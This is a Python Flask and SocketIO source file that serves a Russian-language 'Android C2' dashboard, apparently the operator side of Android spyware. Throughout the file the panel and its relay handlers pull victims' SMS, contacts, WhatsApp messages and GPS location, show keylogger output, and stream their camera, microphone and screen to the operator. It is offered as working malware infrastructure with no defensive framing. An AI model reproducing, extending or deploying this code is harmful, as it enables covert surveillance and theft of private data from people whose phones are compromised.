from flask import Flask, render_template_string
from flask_socketio import SocketIO
import os
import time
import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

clients = {}
activity_logs = {}
wa_logs = {}

HTML = """
<!DOCTYPE html>
<html lang="ru" class="dark">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard | Android Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; }
        .font-mono { font-family: 'JetBrains Mono', monospace; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0b0f19; }
        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #374151; }
        .sidebar { background-color: #111827; border-right: 1px solid #1f2937; z-index: 100; position: relative; }
        .sidebar-item { transition: all 0.2s ease; border-left: 3px solid transparent; }
        .sidebar-item:hover { background-color: #1f2937; border-left-color: #3b82f6; }
        .sidebar-item.active { background-color: #1f2937; border-left-color: #3b82f6; color: #fff; }
        .client-row { transition: background-color 0.2s; }
        .client-row:hover { background-color: #1f2937; cursor: pointer; }
        .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
        .toggle-switch { position: relative; display: inline-block; width: 40px; height: 22px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 22px; }
        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: #10b981; }
        input:checked + .slider:before { transform: translateX(18px); }
        .fade-in { animation: fadeIn 0.3s ease-in-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="h-screen overflow-hidden flex">

    <!-- SIDEBAR -->
    <aside class="sidebar w-72 flex flex-col h-full">
        <div class="p-4 border-b border-gray-800 flex items-center gap-3">
            <div class="w-8 h-8 rounded bg-green-600 flex items-center justify-center text-white font-bold"><i class="fa-solid fa-mobile-screen"></i></div>
            <div><h1 class="text-sm font-bold text-white">ANDROID C2</h1><p class="text-[10px] text-gray-500 font-mono">v8.0.0</p></div>
        </div>

        <div class="flex-1 overflow-y-auto p-2">
            <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider">Устройства</div>
            <div id="client-list" class="space-y-1"></div>
        </div>

        <div id="main-menu" class="hidden border-t border-gray-800 p-2 space-y-1">
            <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider mt-2">Действия</div>
            
            <div onclick="switchView('phone-info')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-mobile-button w-4 text-center"></i> Info</div>
            <div onclick="switchView('phone-sms')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-sms w-4 text-center"></i> SMS</div>
            <div onclick="switchView('phone-contacts')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-address-book w-4 text-center"></i> Contacts</div>
            <div onclick="switchView('phone-wa')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-brands fa-whatsapp w-4 text-center text-green-500"></i> WhatsApp</div>
            <div onclick="switchView('phone-cam')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-camera w-4 text-center"></i> Camera</div>
            <div onclick="switchView('phone-mic')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-microphone w-4 text-center"></i> Microphone</div>
            <div onclick="switchView('phone-screen')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-tv w-4 text-center"></i> Screen</div>
            <div onclick="switchView('phone-gps')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-location-dot w-4 text-center"></i> GPS</div>
            <div onclick="switchView('keylog')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-keyboard w-4 text-center"></i> Spy Logs</div>
        </div>
    </aside>

    <!-- MAIN CONTENT -->
    <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative">
        <header class="h-14 border-b border-gray-800 flex items-center justify-between px-6 bg-[#111827]">
            <div class="flex items-center gap-4">
                <h2 id="active-client-name" class="text-sm font-semibold text-gray-300">Выберите клиента</h2>
                <span id="active-client-ip" class="text-xs font-mono text-green-400"></span>
                <span id="active-client-uptime" class="text-xs font-mono text-gray-500"></span>
            </div>
            <div class="flex items-center gap-2 text-xs font-mono text-gray-400">
                <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div> СЕРВЕР ONLINE
            </div>
        </header>

        <div id="view-empty" class="flex-1 flex flex-col items-center justify-center text-gray-600">
            <i class="fa-solid fa-mobile-screen text-6xl mb-4 opacity-20"></i>
            <p class="text-sm font-mono">УСТРОЙСТВО НЕ ВЫБРАНО</p>
        </div>

        <!-- INFO -->
        <div id="view-phone-info" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <h2 class="text-lg font-bold text-white mb-6">Информация об устройстве</h2>
            <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 font-mono text-sm text-gray-300 space-y-2" id="phone-info-data"></div>
        </div>

        <!-- SMS -->
        <div id="view-phone-sms" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">SMS Сообщения</h2>
                <button onclick="dumpData('sms')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Запросить SMS</button>
            </div>
            <div id="sms-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
        </div>

        <!-- CONTACTS -->
        <div id="view-phone-contacts" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">Контакты</h2>
                <button onclick="dumpData('contacts')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Запросить Контакты</button>
            </div>
            <div id="contacts-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
        </div>

        <!-- WHATSAPP -->
        <div id="view-phone-wa" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
            <h2 class="text-lg font-bold text-white mb-4"><i class="fa-brands fa-whatsapp text-green-500"></i> WhatsApp Логи</h2>
            <div id="wa-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300">Ожидание сообщений...</div>
        </div>

        <!-- GPS -->
        <div id="view-phone-gps" class="hidden flex-1 p-6 overflow-y-auto fade-in flex-col">
            <div class="flex justify-between items-center mb-4 max-w-4xl">
                <h2 class="text-lg font-bold text-white">GPS Локация</h2>
                <button onclick="dumpData('geo')" class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-location-crosshairs"></i> Обновить Гео</button>
            </div>
            <div id="gps-data" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-6 flex flex-col items-center justify-center text-gray-400 font-mono">Ожидание...</div>
        </div>

        <!-- CAMERA -->
        <div id="view-phone-cam" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Камера</h2>
                <div class="flex gap-4">
                    <button onclick="switchCamera()" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-sync"></i> Сменить</button>
                    <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                        <span class="text-xs text-gray-400">Включить</span>
                        <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"><span class="slider"></span></label>
                    </div>
                </div>
            </div>
            <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
                <img id="cam-img" src="" class="max-h-full max-w-full object-contain hidden">
                <span id="cam-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
            </div>
        </div>

        <!-- MICROPHONE -->
        <div id="view-phone-mic" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Микрофон</h2>
                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                    <span class="text-xs text-gray-400">Слушать</span>
                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
                </div>
            </div>
            <div class="border border-gray-800 rounded-lg bg-black h-[300px] flex flex-col items-center justify-center text-gray-600">
                <i class="fa-solid fa-headphones text-6xl mb-4 text-green-500/50"></i>
                <p class="font-mono text-sm">AUDIO STREAM ACTIVE</p>
            </div>
        </div>

        <!-- SCREEN -->
        <div id="view-phone-screen" class="hidden flex-1 p-6 overflow-y-auto fade-in">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Экран</h2>
                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
                    <span class="text-xs text-gray-400">Включить</span>
                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('screen', this.checked)"><span class="slider"></span></label>
                </div>
            </div>
            <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
                <img id="scr-img" src="" class="max-h-full max-w-full object-contain hidden">
                <span id="scr-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
            </div>
        </div>

        <!-- SPY LOGS -->
        <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6 space-y-4">
            <div class="flex-1 flex flex-col min-h-0">
                <h2 class="text-sm font-bold text-white mb-2"><i class="fa-solid fa-keyboard text-blue-400 mr-2"></i>Keylogger</h2>
                <div id="keylog-output" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm text-green-500 whitespace-pre-wrap break-all"></div>
            </div>
        </div>

    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let currentClientId = null;
        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        let lastClientsData = {};

        setInterval(() => {
            if (currentClientId && lastClientsData[currentClientId]) {
                const c = lastClientsData[currentClientId];
                const up = Math.floor(Date.now() / 1000 - c.connected_at);
                document.getElementById('active-client-uptime').innerText = `В сети: ${formatUptime(up)}`;
            }
        }, 1000);

        function formatUptime(seconds) {
            if (seconds < 60) return `${seconds} сек`;
            const m = Math.floor(seconds / 60);
            if (m < 60) return `${m} мин`;
            const h = Math.floor(m / 60);
            return `${h} ч ${m % 60} мин`;
        }

        socket.on('update_clients', (data) => {
            lastClientsData = data;
            const list = document.getElementById('client-list');
            list.innerHTML = '';
            for (let id in data) {
                const c = data[id];
                const div = document.createElement('div');
                div.className = `client-row flex items-center justify-between px-3 py-2 rounded text-xs border border-transparent ${currentClientId === id ? 'selected border-blue-800' : ''}`;
                div.innerHTML = `
                    <div class="flex flex-col gap-1">
                        <span class="font-bold text-gray-200">${c.user}</span>
                        <span class="font-mono text-[10px] text-gray-500">${c.ip}</span>
                    </div>
                    <div class="flex flex-col items-end gap-1">
                        <span class="text-[10px] text-gray-400">${formatUptime(Math.floor(Date.now()/1000 - c.connected_at))}</span>
                        <div class="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_5px_#10b981]"></div>
                    </div>
                `;
                div.onclick = () => selectClient(id, c);
                list.appendChild(div);
            }
        });

        function selectClient(id, data) {
            currentClientId = id;
            document.getElementById('active-client-name').innerText = data.user;
            document.getElementById('active-client-ip').innerText = data.ip;
            document.getElementById('view-empty').classList.add('hidden');
            document.getElementById('main-menu').classList.remove('hidden');
            switchView('phone-info');
            if (data.info) document.getElementById('phone-info-data').innerText = JSON.stringify(data.info, null, 2);
        }

        function switchView(view) {
            if (!currentClientId) return;
            document.querySelectorAll('main > div[id^="view-"]').forEach(el => el.classList.add('hidden'));
            document.getElementById(`view-${view}`).classList.remove('hidden');
            document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
            if (event && event.currentTarget) event.currentTarget.classList.add('active');
        }

        function toggleFeature(feature, state) { socket.emit('toggle_feature', {client_id: currentClientId, feature, state}); }
        function switchCamera() { socket.emit('switch_camera', {client_id: currentClientId}); }
        function dumpData(type) { socket.emit('cmd_dump', {client_id: currentClientId, type}); }

        socket.on('phone_cam', (d) => { if (d.client_id === currentClientId) { const i = document.getElementById('cam-img'); i.src = 'data:image/jpeg;base64,' + d.img; i.classList.remove('hidden'); document.getElementById('cam-placeholder').classList.add('hidden'); } });
        socket.on('phone_screen', (d) => { if (d.client_id === currentClientId) { const i = document.getElementById('scr-img'); i.src = 'data:image/jpeg;base64,' + d.img; i.classList.remove('hidden'); document.getElementById('scr-placeholder').classList.add('hidden'); } });
        
        socket.on('phone_mic', (d) => {
            if (d.client_id !== currentClientId) return;
            const binary = atob(d.data); const bytes = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
            const buffer = audioCtx.createBuffer(1, bytes.length / 2, 44100);
            const channel = buffer.getChannelData(0); const view = new DataView(bytes.buffer);
            for (let i = 0; i < bytes.length / 2; i++) channel[i] = view.getInt16(i * 2, true) / 32768;
            const src = audioCtx.createBufferSource(); src.buffer = buffer; src.connect(audioCtx.destination); src.start();
        });

        socket.on('phone_data', (d) => {
            if (d.client_id !== currentClientId) return;
            if (d.type === 'sms') document.getElementById('sms-list').innerText = JSON.stringify(d.payload, null, 2);
            if (d.type === 'contacts') document.getElementById('contacts-list').innerText = JSON.stringify(d.payload, null, 2);
            if (d.type === 'geo') document.getElementById('gps-data').innerHTML = `<a href="https://www.google.com/maps?q=${d.payload.lat},${d.payload.lon}" target="_blank" class="text-blue-400 hover:underline"><i class="fa-solid fa-map-location-dot mr-2"></i>${d.payload.lat}, ${d.payload.lon}</a>`;
        });

        socket.on('whatsapp_msg', (d) => {
            if (d.client_id !== currentClientId) return;
            const el = document.getElementById('wa-list');
            if (el.innerText === 'Ожидание сообщений...') el.innerText = '';
            el.innerText += `[${d.time}] ${d.text}\n`;
            el.scrollTop = el.scrollHeight;
        });

        socket.on('keylog', (d) => {
            if (d.client_id === currentClientId) {
                const out = document.getElementById('keylog-output'); out.innerText += d.data; out.scrollTop = out.scrollHeight;
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@socketio.on('connect')
def handle_connect(): socketio.emit('update_clients', clients)

@socketio.on('register_client')
def handle_register(data):
    data['connected_at'] = time.time()
    clients[data['id']] = data
    socketio.emit('update_clients', clients)

@socketio.on('toggle_feature')
def handle_toggle(data): socketio.emit('cmd_toggle', data)

@socketio.on('switch_camera')
def handle_switch(data): socketio.emit('cmd_switch_camera', data)

@socketio.on('cmd_dump')
def handle_dump(data): socketio.emit('cmd_dump', data)

@socketio.on('phone_data')
def handle_phone_data(data): socketio.emit('phone_data', data)

@socketio.on('phone_cam')
def handle_phone_cam(data): socketio.emit('phone_cam', data)

@socketio.on('phone_screen')
def handle_phone_screen(data): socketio.emit('phone_screen', data)

@socketio.on('phone_mic')
def handle_phone_mic(data): socketio.emit('phone_mic', data)

@socketio.on('whatsapp_notify')
def handle_whatsapp(data): socketio.emit('whatsapp_msg', data)

@socketio.on('keylog')
def handle_keylog(data): socketio.emit('keylog', data)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
